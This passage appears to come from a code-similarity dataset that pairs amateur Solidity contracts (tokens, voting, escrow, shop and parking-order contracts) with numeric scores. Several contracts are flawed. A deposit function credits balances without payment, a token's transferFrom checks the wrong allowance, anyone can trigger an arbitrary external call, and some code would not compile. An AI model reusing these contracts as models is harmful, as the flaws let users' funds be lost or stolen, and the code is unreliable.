	function () external payable {
		require(now >= startTime && now <= endTime);
		require(hardCap >= msg.value + totalContributed);
		require(msg.value >= 10 ** 17);
		totalContributed += msg.value;
	}

	modifier onlyOwner() {
		assert(msg.sender == owner);
		_;
	}

	function forwardFunds(address _to, uint256 _value) onlyOwner public returns (bool success) {
		require(_to != address(0));
		_to.transfer(_value);
		return true;
	}

}"
"contract Buyproduct{

    uint public orderCount = 0;
    mapping(uint => Order) public orders;

    uint public productCount = 0;
    mapping(uint => Product) public products;

    uint public userCount = 0;
    mapping(address => User) public users;

    struct Order {
        uint oid;
        address payable seller;
        address payable buyer;
      
        string status;
        uint pid;
        string location;
        uint quantitiy;
    }

    struct Product {
        uint pid;
        string name;
        uint price;
        address payable seller;

        string info;
        uint quantity;
    }

    struct User {
        uint uid;
        string name;
        uint role;
        address payable user;
        string location;
        bool created;
    }

    event ProductCreated(
        uint pid,
        string name,
        uint price,
        address payable seller,
        string info,
        uint quantity
    );

    event  UserCreated(
        uint uid,
        string name,
        uint role,
        address payable user,
        string location,
        bool created
    );

    event ProductPurchased(
        uint oid,
        address payable seller,
        address payable buyer,
        string status,
        uint pid,
        string location,
        uint quantity
    );

    event ReviewAdded(
        uint rid,
        address reviewer,
        uint pid,
        string review
    );

    function createUser(string memory _name, uint _role, string memory _location) public payable{
        
        require(users[msg.sender].created == false, 'User already created');
        
        userCount++;
        
        users[msg.sender] = User(userCount, _name, _role, msg.sender, _location, true);
        
        emit UserCreated(userCount, _name, _role, msg.sender, _location, true);
    }

    function createProduct(string memory _name, uint _price, string memory _info, uint _quantity) public payable {
        
        require(_price > 0, 'Invalid Price');
        
        productCount ++;
        
        products[productCount] = Product(productCount, _name, _price, msg.sender, _info, _quantity);
        
        emit ProductCreated(productCount, _name, _price, msg.sender, _info, _quantity);
    }

    function purchaseProduct(uint _id,  uint _quantity) public payable {
        
        Product memory _product = products[_id];
        
        address payable _seller = _product.seller;
        
        require(users[msg.sender].created == true, 'Unregistered user');
        
        require(_product.pid > 0 && _product.pid <= productCount, 'Invalid Product ID');
        
        require(msg.value >= _product.price, 'Not enough ether in Wallet');
        
        require(_seller != msg.sender,'Invalid Purchase');
        
        orderCount++;
        
        orders[orderCount] = Order(orderCount, _seller, msg.sender, 'Ordered', _product.pid, users[msg.sender].location, _quantity);
        
        _product.quantity -= _quantity;
        
        address payable wallet = address(uint160(address(this)));
        wallet.transfer(msg.value);
        
        emit ProductPurchased(orderCount, _seller, msg.sender,  'Ordered', _product.pid, users[msg.sender].location, _quantity);
    }


}",0.5807670252073007,"contract NuruToken  {

    

    string public name;

    

    

	string public symbol;

	

	

	uint8 public decimals; 

  

  

  mapping(address => uint) _balances;

  mapping(address => mapping( address => uint )) _approvals;

  

  

  uint public cap_nuru;

  

  

  uint public _supply;

  



  event TokenMint(address newTokenHolder, uint amountOfTokens);

  event TokenSwapOver();

  

  event Transfer(address indexed from, address indexed to, uint value );

  event Approval(address indexed owner, address indexed spender, uint value );

  event mintting(address indexed to, uint value );

  event minterTransfered(address indexed prevCommand, address indexed nextCommand);

 

 

address public dev;





modifier cap_reached(uint amount) {

    

    if((_supply + amount) > cap_nuru) revert();

    _;

}





modifier onlyMinter {

    

      if (msg.sender != dev) revert();

      _;

  }

  

  

  

 function NuruToken(uint cap_token, uint initial_balance, string tokenName, string tokenSymbol, uint8 decimalUnits) public {

    

    cap_nuru = cap_token;

    _supply += initial_balance;

    _balances[msg.sender] = initial_balance;

    

    decimals = decimalUnits;

	symbol = tokenSymbol;

	name = tokenName;

    dev = msg.sender;

    

  }





function totalSupply() public constant returns (uint supply) {

    return _supply;

  }





function balanceOf(address who) public constant returns (uint value) {

    return _balances[who];

  }





function allowance(address _owner, address spender) public constant returns (uint _allowance) {

    return _approvals[_owner][spender];

  }



  

function safeToAdd(uint a, uint b) internal returns (bool) {

    return (a + b >= a && a + b >= b);

  }





function transfer(address to, uint value) public returns (bool ok) {



    if(_balances[msg.sender] < value) revert();

    

    if(!safeToAdd(_balances[to], value)) revert();

    



    _balances[msg.sender] -= value;

    _balances[to] += value;

    Transfer(msg.sender, to, value);

    return true;

  }





function transferFrom(address from, address to, uint value) public returns (bool ok) {

    

    if(_balances[from] < value) revert();



    

    if(_approvals[from][msg.sender] < value) revert();

    

    if(!safeToAdd(_balances[to], value)) revert();

    

    

    _approvals[from][msg.sender] -= value;

    _balances[from] -= value;

    _balances[to] += value;

    Transfer(from, to, value);

    return true;

  }

  

  



function approve(address spender, uint value)

    public

    returns (bool ok) {

    _approvals[msg.sender][spender] = value;

    Approval(msg.sender, spender, value);

    return true;

  }









function mint(address recipient, uint amount) onlyMinter cap_reached(amount) public

  {

        

   _balances[recipient] += amount;  

   _supply += amount;

    

   

    mintting(recipient, amount);

  }

  

 

function transferMintership(address newMinter) public onlyMinter returns(bool)

  {

    dev = newMinter;

    

    minterTransfered(dev, newMinter);

  }

  

}"
"contract test{

  mapping(uint8 => bytes32) public check;
  uint8 [] public array;

  function Adddata(string document, uint8 number)  returns (bytes32) {
    check[number] = sha256(document);
    array.push(number);
    return check[number]; 

  }

  function Getdata(uint8 number) returns(bytes32){
    return check[number];
  }
}",0.5729829475513817,"contract KeyCup  {

  function generateQR(string memory salt) public view returns (bytes32 hash) {

    hash = keccak256(abi.encodePacked(address(this),msg.sender, salt));

  }

  function hashQRCode(bytes32 qr, uint256 pin) public pure returns (bytes32 hash) {

    hash = keccak256(abi.encodePacked(qr, pin));

  }

}"
"contract sampcont2{

    struct customer{
        uint custid;
        uint custvalue1;
        uint custvalue2;
        uint custvalue3;
        string comments;

    }

    mapping(uint => customer) customers;

      function setvalues(uint cid,uint a,uint b,uint c) {
        customers[cid].custid = cid;
        customers[cid].custvalue1 = a;
        customers[cid].custvalue2 = b;
        customers[cid].custvalue3 = c;

    }


    function getvalues(uint id) constant returns (uint x,uint y,uint z) {

         return (customers[id].custvalue1,customers[id].custvalue2,
         customers[id].custvalue3);
    }                
}",0.5066206066585981,"contract AbstractPaymentEscrow is Ownable {

    address public wallet;

    mapping (uint => uint) public deposits;

    event Payment(address indexed _customer, uint indexed _projectId, uint value);
    event Withdraw(address indexed _wallet, uint value);

    function withdrawFunds() public;

    
    function changeWallet(address _wallet)
        public
        onlyOwner()
    {
        wallet = _wallet;
    }

    
    function getDeposit(uint _projectId)
        public
        constant
        returns (uint)
    {
        return deposits[_projectId];
    }
}"
"contract PubSub
{
    address[] subscribers;

    function PubSub() {
    }

    function Subscribe() {
        subscribers.push(msg.sender);
    }

    function Publish(uint value) {

        
        
        
        for(uint i=0; i<subscribers.length; i++) {
            
        }
    }
}",0.545947419018087,"contract BablosTokenInterface is ERC20 {

  bool public frozen;

  function burn(uint256 _value) public;

  function setSale(address _sale) public;

  function thaw() external;

}"
"contract test{

    event LogTest(
        bytes32[5] a
    ); 

    bytes32[5]  attr;

    function attributes() internal {
        attr[0] = ""0x0""; attr[1] = ""0x1""; attr[2] = ""0x2""; attr[3] = ""0x3""; attr[4] = ""0x4"";
    }

    function getA() public{
        attributes();
        LogTest(attr);
    }

}",0.5038794657306019,"contract iERC223Token {
    function transfer(address to, uint value, bytes data) public returns (bool ok);
    function transferFrom(address from, address to, uint value, bytes data) public returns (bool ok);
}"
"contract ManagingOrder{
 address public owner;
 uint256 count;
 uint256 parkingCount;
 string order_list;
 uint256 order_number;
 string public result;

 
 struct Order {
        uint256 orderNumber;
        address buyer;
        address seller;
        uint256 parkingNumber;
        State state;
        string new_hour;
        uint256 cost;
        uint date;
    }

struct Parking {
        uint256 parkingNumber;
        address seller;
        string name;
        string phoneNumber;
        string postal_code;
        string avail_hour;
        string park_address;
    }


struct Buyer{
        string name;
        string phoneNumber;
}


    mapping(uint => Order) private ordersMap;
    mapping(uint => Parking) private parkingsMap;
    mapping(address => uint256) balancesMap;
    mapping(address => Buyer) private buyersMap;

 
 enum State { Created, Pending, Completed, Aborted }


 function ManageOrder() public{
 owner = msg.sender;
 count = 0;
 parkingCount=0;
 }

 
 modifier onlyBuyer(uint256 order_no) {
        require(msg.sender == ordersMap[order_no].buyer);
        _;
    }

 
 modifier onlySeller(uint256 order_no) {
        require(msg.sender == ordersMap[order_no].seller);
        _;
    }

 
 modifier inState(State _state, uint256 order_no) {
        require(ordersMap[order_no].state == _state);
        _;
    }

 
 modifier isMoney(uint _cost){
        require(balancesMap[msg.sender]>=_cost);
        _;
    }

 
 modifier isSeller(uint parkingNumber){
         
    require((parkingsMap[parkingNumber].postal_code)!=0);
    _;
 }


 function depositEther(uint _value) public returns (bool success){
     if(balancesMap[msg.sender]<0){
     return false;}

     balancesMap[msg.sender]+=_value;
     return true;
 }

 
   function newParking(string memory _name, string memory _phoneNumber, string memory _postal_code, string memory _park_address) public {
    bool parking_exists = false;
    uint parking_number;


    for(uint i=1; i<=parkingCount; i++){
        if (parkingsMap[parkingCount].seller == msg.sender){
            parking_exists = true;
            parking_number = parkingCount;
        }
    }

    if(!parking_exists){
        parkingCount++;
    Parking memory new_Parking = Parking({
            parkingNumber:parkingCount,
            seller:msg.sender,
            name:_name,
            phoneNumber: _phoneNumber,
            postal_code:_postal_code,
            avail_hour:""000000000000000000000000000000000000000000000000000000000000000000000000"",
            park_address:_park_address
        });

    
    parkingsMap[parkingCount] = new_Parking;
    }else{

        parkingsMap[parking_number].name = _name;
        parkingsMap[parking_number].phoneNumber = _phoneNumber;
        parkingsMap[parking_number].postal_code = _postal_code;
        parkingsMap[parking_number].park_address= _park_address;
    }

 }

 
  function newBuyer(string memory _name, string memory _phoneNumber) public{
  

      if(bytes(buyersMap[msg.sender].name).length==0){
          Buyer memory new_Buyer = Buyer({
         name:_name,
         phoneNumber:_phoneNumber

         });
         buyersMap[msg.sender] = new_Buyer;
      }else{

         buyersMap[msg.sender].name = _name;
         buyersMap[msg.sender].phoneNumber=_phoneNumber;
      }
 }

 
 function newOrder(uint256 _parkingNumber, uint256 _cost, string memory _avail_hour, string memory _new_hour) public
 
        isMoney(_cost)
        isSeller(_parkingNumber)
    {

    count = count+1;

    Order memory new_Order = Order({
            orderNumber: count,
            parkingNumber: _parkingNumber,
            buyer: msg.sender,
            seller:parkingsMap[_parkingNumber].seller,
            state: State.Created,
            new_hour:_new_hour,
            cost:_cost,
            date:now
        });
    
    ordersMap[count] = new_Order;
    parkingsMap[_parkingNumber].avail_hour = _avail_hour; 
    balancesMap[ordersMap[count].buyer] -= _cost;
    ordersMap[count].state = State.Pending;
 }


 
 function checkParking(uint _parkingNumber) public returns (string memory _hour){

    result = concatFourStrings(concatThreeStrings(parkingsMap[_parkingNumber].name, parkingsMap[_parkingNumber].phoneNumber, parkingsMap[_parkingNumber].postal_code), parkingsMap[_parkingNumber].avail_hour, parkingsMap[_parkingNumber].park_address, """");
    return result;
 }

 
 function checkBuyer() public view returns (string memory)  {

    result = concatThreeStrings(buyersMap[msg.sender].name,buyersMap[msg.sender].phoneNumber,"""");
    return result;
 }


 function numberParking() public view returns (string memory){
    for(uint i=1; i<=parkingCount; i++){
        if (parkingsMap[parkingCount].seller == msg.sender){
            result = concatFourStrings(concatThreeStrings(parkingsMap[parkingCount].name, parkingsMap[parkingCount].phoneNumber, parkingsMap[parkingCount].postal_code), parkingsMap[parkingCount].avail_hour, parkingsMap[parkingCount].park_address,uintToString(parkingCount));

        }
    }
    return result;
 }   

 
 function manageParking(uint256 _parkingNumber, string memory _avail_hour) public
 isSeller(_parkingNumber)
 {
    if(parkingsMap[_parkingNumber].seller == msg.sender)
    parkingsMap[_parkingNumber].avail_hour= _avail_hour;
 }

 
 function orderList() public returns (string memory)  {
    uint256 display_number = 0;
    string[4] memory sub_result ;
    for(uint256 i=0; i<count+1; i++){

      if (((ordersMap[i].buyer==msg.sender)||(ordersMap[i].seller==msg.sender))&&((ordersMap[i].state!=State.Completed)&&(ordersMap[i].state!=State.Aborted))&&(display_number<4)){
          string memory _a = uintToString(ordersMap[i].orderNumber);
          string memory _b = uintToString(ordersMap[i].parkingNumber);
          string memory _c = enumToString(ordersMap[i].state);
          string memory _d = uintToString(ordersMap[i].cost);
          string memory _e = uintToString(ordersMap[i].date);

          
          
          
          sub_result[display_number] = concatFourStrings(concatThreeStrings(_a,_b,_c),_d,_e,ordersMap[i].new_hour);
          display_number++;
      }
    }
    
    
    result = ordersMapConcat(sub_result[0],sub_result[1],sub_result[2],sub_result[3],"""");
    return result; 
 }

 
 function concatThreeStrings(string memory _a, string memory _b, string memory _c) internal returns (string memory){
    bytes memory _bytes_a = bytes(_a);
    bytes memory _bytes_b = bytes(_b);
    bytes memory _bytes_c = bytes(_c);

    string memory abc = new string(_bytes_a.length + _bytes_b.length + _bytes_c.length + 3);
    bytes memory babc = bytes(abc);
    uint k = 0;
    for (uint i = 0; i < _bytes_a.length; i++) babc[k++] = _bytes_a[i];
    babc[k++] = ""*"";
    for (uint i = 0; i < _bytes_b.length; i++) babc[k++] = _bytes_b[i];
    babc[k++] = ""*"";
    for (uint i = 0; i < _bytes_c.length; i++) babc[k++] = _bytes_c[i];
    return string(babc);
}


function concatFourStrings(string memory _a, string memory _b, string memory _c, string memory _d) internal returns (string memory){
    bytes memory _bytes_a = bytes(_a);
    bytes memory _bytes_b = bytes(_b);
    bytes memory _bytes_c = bytes(_c);
    bytes memory _bytes_d = bytes(_d);

    string memory abcd = new string(_bytes_a.length + _bytes_b.length + _bytes_c.length + _bytes_d.length + 4);
    bytes memory babcd = bytes(abcd);
    uint k = 0;
    for (uint i = 0; i < _bytes_a.length; i++) babcd[k++] = _bytes_a[i];

    babcd[k++] = ""*"";
    for (uint i = 0; i < _bytes_b.length; i++) babcd[k++] = _bytes_b[i];
    babcd[k++] = ""*"";
    for (uint i = 0; i < _bytes_c.length; i++) babcd[k++] = _bytes_c[i];
    babcd[k++] = ""*"";
    for (uint i = 0; i < _bytes_d.length; i++) babcd[k++] = _bytes_d[i];

    babcd[k++] = ""%"";
    return string(babcd);
}


function ordersMapConcat(string memory _a, string memory _b, string memory _c, string memory _d, string memory _e) internal returns (string memory){
    bytes memory _bytes_a = bytes(_a);
    bytes memory _bytes_b = bytes(_b);
    bytes memory _bytes_c = bytes(_c);
    bytes memory _bytes_d = bytes(_d);
    bytes memory _bytes_e = bytes(_e);
    
    string memory abcde = new string(_bytes_a.length + _bytes_b.length + _bytes_c.length + _bytes_d.length + _bytes_e.length);
    bytes memory babcde = bytes(abcde);
    uint k = 0;
    for (uint i = 0; i < _bytes_a.length; i++) babcde[k++] = _bytes_a[i];
    for (uint i = 0; i < _bytes_b.length; i++) babcde[k++] = _bytes_b[i];
    for (uint i = 0; i < _bytes_c.length; i++) babcde[k++] = _bytes_c[i];
    for (uint i = 0; i < _bytes_d.length; i++) babcde[k++] = _bytes_d[i];
    for (uint i = 0; i < _bytes_e.length; i++) babcde[k++] = _bytes_e[i];
    return string(babcde);
}

 

 function abortOrder(uint256 order_no) public
        inState(State.Pending,order_no)
    {

        address payable buyer = ordersMap[order_no].buyer;
        address payable seller = ordersMap[order_no].seller;

        if(msg.sender==ordersMap[order_no].buyer)
        {
        ordersMap[order_no].state = State.Aborted;
        
        buyer.transfer(ordersMap[order_no].cost*8/10);
        
        seller.transfer(ordersMap[order_no].cost*2/10);
        }
        else if(msg.sender==ordersMap[order_no].seller)
        {
        
        ordersMap[order_no].state = State.Aborted;

        
        buyer.transfer(ordersMap[order_no].cost*12/10);
        balancesMap[seller]-=ordersMap[order_no].cost*2/10;
        }

    }

 
 function confirmOrder(uint256 order_no) public
        onlyBuyer(order_no)
        inState(State.Pending,order_no)
    {
        
        ordersMap[order_no].state = State.Completed;
        address payable seller = ordersMap[order_no].seller;
        
        seller.transfer(ordersMap[order_no].cost);
        balancesMap[ordersMap[order_no].seller] += ordersMap[order_no].cost;
    }



 function () external payable {
     balancesMap[msg.sender]+=msg.value;
 }



 function uintto() public view returns (string memory){
     return result;
 }

 
function uintToString(uint v) public view returns (string memory str) {
        uint maxlength = 100;
        bytes memory reversed = new bytes(maxlength);
        uint i = 0;
        while (v != 0) {
            uint remainder = v % 10;
            v = v / 10;
            reversed[i++] = (48 + remainder);
        }
        bytes memory s = new bytes(i + 1);
        for (uint j = 0; j <= i; j++) {
            s[j] = reversed[i - j];
        }
        str = string(s);
    }


function enumToString(State _state) public view returns (string memory str){
    uint256 _temp;
    if(_state==State.Created){
        _temp = 1;
    }else if(_state==State.Pending){
        _temp = 2;
    }else if(_state==State.Completed){
        _temp = 3;
    }else {
        _temp = 4;
    }
    str = uintToString(_temp);
}


function addressToString(address x) public returns (string memory) {
    bytes memory b = new bytes(20);
    for (uint i = 0; i < 20; i++)
        b[i] = byte(uint8(uint(x) / (2**(8*(19 - i)))));
    return string(b);
}

}",0.5212325161381866,"contract LavaToken is ECRecovery{



    using SafeMath for uint;



    address constant public masterToken = 0xB6eD7644C69416d67B522e20bC294A9a9B405B31;



    string public name     = ""Lava"";

    string public symbol   = ""LAVA"";

    uint8  public decimals = 8;

    uint private _totalSupply;



    event  Approval(address indexed src, address indexed ext, uint amt);

    event  Transfer(address indexed src, address indexed dst, uint amt);

    event  Deposit(address indexed dst, uint amt);

    event  Withdrawal(address indexed src, uint amt);



    mapping (address => uint)                       public  balances;

    mapping (address => mapping (address => uint))  public  allowance;



    mapping (bytes32 => uint256)                    public burnedSignatures;





  struct LavaPacket {

    string methodName; 

    address relayAuthority; 

    address from; 

    address to; 

    address wallet;  

    uint256 tokens; 

    uint256 relayerRewardTokens; 

    uint256 expires; 

    uint256 nonce; 

  }













  bytes32 constant EIP712DOMAIN_TYPEHASH = keccak256(

        ""EIP712Domain(string contractName,string version,uint256 chainId,address verifyingContract)""

    );



 function getLavaDomainTypehash() public pure returns (bytes32) {

    return EIP712DOMAIN_TYPEHASH;

 }



  function getEIP712DomainHash(string memory contractName, string memory version, uint256 chainId, address verifyingContract) public pure returns (bytes32) {



    return keccak256(abi.encode(

          EIP712DOMAIN_TYPEHASH,

          keccak256(bytes(contractName)),

          keccak256(bytes(version)),

          chainId,

          verifyingContract

      ));

  }



  bytes32 constant LAVAPACKET_TYPEHASH = keccak256(

     ""LavaPacket(string methodName,address relayAuthority,address from,address to,address wallet,uint256 tokens,uint256 relayerRewardTokens,uint256 expires,uint256 nonce)""

 );



  function getLavaPacketTypehash() public pure returns (bytes32) {

     return LAVAPACKET_TYPEHASH;

 }







 function getLavaPacketHash(string memory methodName, address relayAuthority,address from,address to, address wallet,uint256 tokens,uint256 relayerRewardTokens,uint256 expires,uint256 nonce) public pure returns (bytes32) {

        return keccak256(abi.encode(

            LAVAPACKET_TYPEHASH,

            keccak256(bytes(methodName)),

            relayAuthority,

            from,

            to,

            wallet,

            tokens,

            relayerRewardTokens,

            expires,

            nonce

        ));

    }





    constructor() public {



    }



    

     function() external payable

     {

         revert();

     }





    

    function mutateTokens(address from, uint amount) public returns (bool)

    {



        require( amount >= 0 );



        require( ERC20Interface( masterToken ).transferFrom( from, address(this), amount) );



        balances[from] = balances[from].add(amount);

        _totalSupply = _totalSupply.add(amount);



        emit Transfer(address(this), from, amount);



        return true;

    }







    

    function unmutateTokens( uint amount) public returns (bool)

    {

        address from = msg.sender;

        require( amount >= 0 );



        balances[from] = balances[from].sub(amount);

        _totalSupply = _totalSupply.sub(amount);



        emit Transfer(from, address(this), amount);



        require( ERC20Interface( masterToken ).transfer( from, amount) );



        return true;

    }







   

    function totalSupply() public view returns (uint) {

        return _totalSupply;

    }



   

     function balanceOf(address tokenOwner) public view returns (uint balance) {

        return balances[tokenOwner];

    }



     

    function getAllowance(address owner, address spender) public view returns (uint)

    {

      return allowance[owner][spender];

    }



   

  function approve(address spender,   uint tokens) public returns (bool success) {

      allowance[msg.sender][spender] = tokens;

      emit Approval(msg.sender, spender, tokens);

      return true;

  }





  

   function transfer(address to,  uint tokens) public returns (bool success) {

        balances[msg.sender] = balances[msg.sender].sub(tokens);

        balances[to] = balances[to].add(tokens);

        emit Transfer(msg.sender, to, tokens);

        return true;

    }





   

   function transferFrom( address from, address to,  uint tokens) public returns (bool success) {

       balances[from] = balances[from].sub(tokens);

       allowance[from][to] = allowance[from][to].sub(tokens);

       balances[to] = balances[to].add(tokens);

       emit Transfer( from, to, tokens);

       return true;

   }



  

   function _giveRelayerReward( address from, address to, uint tokens) internal returns (bool success){

     balances[from] = balances[from].sub(tokens);

     balances[to] = balances[to].add(tokens);

     emit Transfer( from, to, tokens);

     return true;

   }





    



   function getLavaTypedDataHash(string memory methodName, address relayAuthority,address from,address to, address wallet,uint256 tokens,uint256 relayerRewardTokens,uint256 expires,uint256 nonce) public view returns (bytes32) {





          

          bytes32 digest = keccak256(abi.encodePacked(

              ""\x19\x01"",

              getEIP712DomainHash('Lava Wallet','1',1,address(this)),

              getLavaPacketHash(methodName,relayAuthority,from,to,wallet,tokens,relayerRewardTokens,expires,nonce)

          ));

          return digest;

      }







    



   function _tokenApprovalWithSignature(  string memory methodName, address relayAuthority,address from,address to, address wallet,uint256 tokens,uint256 relayerRewardTokens,uint256 expires,uint256 nonce, bytes32 sigHash, bytes memory signature) internal returns (bool success)

   {



       





       require( relayAuthority == address(0x0)

         || (!addressContainsContract(relayAuthority) && msg.sender == relayAuthority)

         || (addressContainsContract(relayAuthority) && msg.sender == RelayAuthorityInterface(relayAuthority).getRelayAuthority())  );







       address recoveredSignatureSigner = recover(sigHash,signature);





       

       require(from == recoveredSignatureSigner);



       

       require(address(this) == wallet);



       

       require(block.number < expires);



       uint previousBurnedSignatureValue = burnedSignatures[sigHash];

       burnedSignatures[sigHash] = 0x1; 

       require(previousBurnedSignatureValue == 0x0);



       

       require(_giveRelayerReward(from, msg.sender,   relayerRewardTokens));



       

       allowance[from][to] = tokens;

       emit Approval(from,  to, tokens);





       return true;

   }







   function approveTokensWithSignature(string memory methodName, address relayAuthority,address from,address to, address wallet,uint256 tokens,uint256 relayerRewardTokens,uint256 expires,uint256 nonce, bytes memory signature) public returns (bool success)

   {

       require(bytesEqual('approve',bytes(methodName)));



       bytes32 sigHash = getLavaTypedDataHash(methodName,relayAuthority,from,to,wallet,tokens,relayerRewardTokens,expires,nonce);



       require(_tokenApprovalWithSignature(methodName,relayAuthority,from,to,wallet,tokens,relayerRewardTokens,expires,nonce,sigHash,signature));





       return true;

   }





  function transferTokensWithSignature(string memory methodName, address relayAuthority,address from,address to, address wallet,uint256 tokens,uint256 relayerRewardTokens,uint256 expires,uint256 nonce, bytes memory signature) public returns (bool success)

  {



      require(bytesEqual('transfer',bytes(methodName)));



      

      bytes32 sigHash = getLavaTypedDataHash(methodName,relayAuthority,from,to,wallet,tokens,relayerRewardTokens,expires,nonce);



      require(_tokenApprovalWithSignature(methodName,relayAuthority,from,to,wallet,tokens,relayerRewardTokens,expires,nonce,sigHash,signature));



      

      require(transferFrom( from, to,  tokens));





      return true;



  }





     

     function approveAndCallWithSignature( string memory methodName, address relayAuthority,address from,address to, address wallet,uint256 tokens,uint256 relayerRewardTokens,uint256 expires,uint256 nonce, bytes memory signature ) public returns (bool success)   {



          require(!bytesEqual('approve',bytes(methodName))  && !bytesEqual('transfer',bytes(methodName)));



           

          bytes32 sigHash = getLavaTypedDataHash(methodName,relayAuthority,from,to,wallet,tokens,relayerRewardTokens,expires,nonce);



          require(_tokenApprovalWithSignature(methodName,relayAuthority,from,to,wallet,tokens,relayerRewardTokens,expires,nonce,sigHash,signature));



          _sendApproveAndCall(from,to,tokens,bytes(methodName));



           return true;

     }



     function _sendApproveAndCall(address from, address to, uint tokens, bytes memory methodName) internal

     {

         ApproveAndCallFallBack(to).receiveApproval(from, tokens, address(this), bytes(methodName));

     }









    



     function burnSignature( string memory methodName, address relayAuthority,address from,address to, address wallet,uint256 tokens,uint256 relayerRewardTokens,uint256 expires,uint256 nonce,  bytes memory signature) public returns (bool success)

     {





        bytes32 sigHash = getLavaTypedDataHash(methodName,relayAuthority,from,to,wallet,tokens,relayerRewardTokens,expires,nonce);



         address recoveredSignatureSigner = recover(sigHash,signature);



         

         require(recoveredSignatureSigner == from);



         

         require(from == msg.sender);



         

         uint burnedSignature = burnedSignatures[sigHash];

         burnedSignatures[sigHash] = 0x2; 

         require(burnedSignature == 0x0);



         return true;

     }





    

     function signatureHashBurnStatus(bytes32 digest) public view returns (uint)

     {

       return (burnedSignatures[digest]);

     }









       

     function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public returns (bool success) {



        require(token == masterToken);



        require(mutateTokens(from, tokens));



        return true;



     }









     function addressContainsContract(address _to) view internal returns (bool)

     {

       uint codeLength;



        assembly {

            

            codeLength := extcodesize(_to)

        }



         return (codeLength>0);

     }





     function bytesEqual(bytes memory b1,bytes memory b2) pure internal returns (bool)

        {

          if(b1.length != b2.length) return false;



          for (uint i=0; i<b1.length; i++) {

            if(b1[i] != b2[i]) return false;

          }



          return true;

        }









}"
"contract Votinggame{

       struct Vote {
          address voter;
          string comment;
      }

        struct Project{
            int id;
            string name;
             int votes;
            Vote[] vote;
        }

        Project[] public projects;
        int idcounter=-1;

     function addNewProject(string name) public {

             Project memory newProject = Project({
                 id:idcounter+1,
                 name:name,
                 votes:0

                 
                 

             });
           idcounter=newProject.id;
           projects.push(newProject); 
        }

      function vote(uint index , string comment) public {
        Project storage project = projects[index];
        project.votes++;     
        Vote memory v;
        v.voter = msg.sender;
        v.comment = comment;
        project.voters.push(v);
      }
    }",0.5240947969316853,"contract CrdSet {

    Crowdsourcing[] public list;

    event newContract(Crowdsourcing indexed c);



    function createCC(uint total, string memory content) public payable returns (Crowdsourcing){

        require(msg.value % total == 0, ""Amount of money need to be dividable by the total number of answers"");

        Crowdsourcing a = new Crowdsourcing(msg.sender, total, content, msg.value);

        list.push(a);

        address(a).transfer(msg.value);

        emit newContract(a);

        return a;

    }

    

    function getContracCount() public view returns (uint) {

        return list.length;

    }

    

}"
"contract Voting{

    mapping(bytes32 => uint8) public votesRecived;
    bytes32[] public candidateList;

    function Voting( bytes32[] candidateNames) public{
        candidateList = candidateNames;
    }

    function totalVotesFor(bytes32 candidate) public view returns(uint8){
        require(validCandidate(candidate));
        return votesRecived[candidate];
    }

    function voteForCandiadte(bytes32 candidate) public {
        require(validCandidate(candidate));
        votesRecived[candidate] += 1;

    }

    function validCandidate(bytes32 candidate) view public returns(bool){
        for(uint i = 0; i<candidateList.length; i++){
            if (candidateList[i] == candidate)
            {
                return true;
            }

        }
        return false;    
    }
    function candidateNamesFun() view public returns(bytes32[]){
        return candidateList;
    }

}",0.5727083041815767,"contract CSTRegistry {

  function getGeohash(bytes32 cst) public view returns (bytes32 geohash);

  function getRadius(bytes32 cst) public view returns (uint256 radius);

  function getCreatedOn(bytes32 cst) public view returns (uint256 timestamp);

  function getDeletedOn(bytes32 cst) public view returns (uint256 timestamp);



  function isTracked(bytes32 cst) public view returns (bool);



  event TrackedToken(bytes32 cst, address indexed nftAddress, uint256 tokenID, bytes32 geohash, uint256 radius);









  function computeCST(address nftContract, uint256 tokenID) public pure returns (bytes32) {

    return keccak256(abi.encodePacked(nftContract, tokenID));

  }

}"
"contract SetADT{ 
    struct VoterLog {
        address senderAccount;
        uint256 time;
        uint blockNumber;
    }
    mapping(uint => VoterLog) voterStatus;
    mapping(uint => uint128) voterKeys;
    uint voterIndex;

    mapping(address => bool) validNodes;

    mapping(uint => bool) contractSet; 
    event Print(bool); 
    event PrintAddr(address);

    function setTrue(uint key) external { 
        if(contractSet[key] == false) { 
            contractSet[key] = true;
        } 
        Print(contractSet[key]); 
    } 

    function getValue(uint key) external { 
        Print(contractSet[key]); 
    } 
}",0.5426324931710377,"contract PricingStrategy is Ownable {



  

  function isPricingStrategy() public constant returns (bool) {

    return true;

  }



  

  function isSane(address crowdsale) public constant returns (bool) {

    return true;

  }



  

  function isPresalePurchase(address purchaser) public constant returns (bool) {

    return false;

  }



  

  function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);

}"
"contract Voting
{
    address private m_ToCall; 
    bytes m_Data;
    bool public m_Busy;



    function startVoting(
        address pToCall, 
        bytes calldata pData
    )
        external
    {
        require(!m_Busy);
        
        m_Busy = true;
        m_ToCall = pToCall;
        m_Data = pData;
    }

    function finishVoting()
        external 
        
        
        
    {
        require(m_Busy);
        m_Busy = false;
       (bool success, bytes memory data) =  m_ToCall.call(m_Data);
        require(success, string(data));
    }
}",0.5969529793348568,"contract IMarketBehavior {
	string public schema;

	function authenticate(
		address _prop,
		string calldata _args1,
		string calldata _args2,
		string calldata _args3,
		string calldata _args4,
		string calldata _args5,
		address market
	)
		external
		returns (
			
			address
		);

	function calculate(address _metrics, uint256 _start, uint256 _end)
		external
		returns (bool);
}"
"contract Callee
{
    using SafeSub for uint;
    uint public m_Value;

    function makeChanges(uint pValue)
        external
    {
        m_Value = uint(25).sub(pValue);
    }
}",0.5635715947252284,"contract InstaSave is Save {

    uint public version;

    
    constructor(uint _version) public {
        version = _version;
    }

    function() external payable {}

}"
"contract DocumentHash{

    string public documentHash;
    mapping (string => string) hashAlreadyRegistered;
        
    function setDocumentHash(string memory hash) public {
        require(keccak256( abi.encodePacked((""""))) != keccak256(abi.encodePacked((hash))), ""Empty hash!"");
        require(keccak256( abi.encodePacked((hashAlreadyRegistered[documentHash]))) != keccak256(abi.encodePacked((hash))), ""Hash already registered"");
        
        documentHash = hash;
        hashAlreadyRegistered[documentHash] = hash;
    }
 
    function getDocumentHash() public view returns(string memory) {
        return documentHash;
    }
}",0.5420465361673219,"contract AddressRegistry {

    event LogSetAddress(string name, address addr);



    

    mapping(bytes32 => address) registry;



    

    modifier isAdmin() {

        require(

            msg.sender == getAddress(""admin"") || 

            msg.sender == getAddress(""owner""),

            ""permission-denied""

        );

        _;

    }



    

    

    

    function getAddress(string memory _name) public view returns(address) {

